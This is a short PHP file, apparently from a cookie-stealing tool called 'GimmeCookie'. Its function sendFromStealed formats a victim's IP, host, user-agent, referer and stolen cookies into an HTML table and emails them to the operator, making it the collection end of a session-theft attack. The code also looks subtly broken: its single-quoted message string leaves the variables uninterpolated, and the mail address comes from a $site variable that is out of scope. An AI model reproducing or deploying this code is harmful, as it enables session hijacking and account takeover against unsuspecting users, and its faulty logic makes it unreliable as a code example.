<?PHP
// Protection against unauthorized access
if (!defined('GimmeCookie')) {
    header('Location: ./main');
    die;
}

function sendFromStealed($ip, $host, $navigator, $date, $time, $referer, $data)
{
	// Write stealed data into the string array
	$message ='
	<table width="726" border="1">
	<tr><td>IP:</td><td>Host:</td><td>User-Agent:</td><td>Date:</td><td>Time:</td><td>Referer:</td><td>Cookie:</td></tr>
	<tr><td>$ip</td>
		<td>$host</td>
		<td>$navigator</td>
		<td>$date</td>
		<td>$time</td>
		<td>$referer</td>
		<td>$data</td></tr>
	</table>';
	// Send recieved data on e-mail
	mail($site['mail'], "You recieved new cookies from $ip", $message);
}